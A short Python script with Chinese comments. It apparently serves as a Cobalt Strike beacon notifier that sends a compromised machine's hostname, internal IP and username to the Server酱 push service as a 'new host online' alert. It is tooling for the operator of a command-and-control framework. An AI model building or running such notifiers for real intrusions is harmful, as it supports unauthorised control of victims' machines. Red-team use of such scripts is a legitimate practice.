#coding: utf-8
import argparse
import requests
import random
import string

ser_api = 'SCT7141***********************UX'  # 填入自己的Server酱API，地址：https://sct.ftqq.com/sendkey
parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--username')
args = parser.parse_args()

computername = args.computername
internalip = args.internalip
username = args.username

ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))


title = "CobaltStrike 上线提醒"
content = """

**您有新主机上线啦 ！**

**IP: {}**

**主机名: {}**

**用户名: {}**

**Token: {}**

**请注意查收哦 ~**
""".format(internalip, computername, username, ran_str)

# 新的 Server酱推送接口有变化
resp = requests.post("https://sctapi.ftqq.com/{}.send".format(ser_api),
data={"text": title, "desp": content})
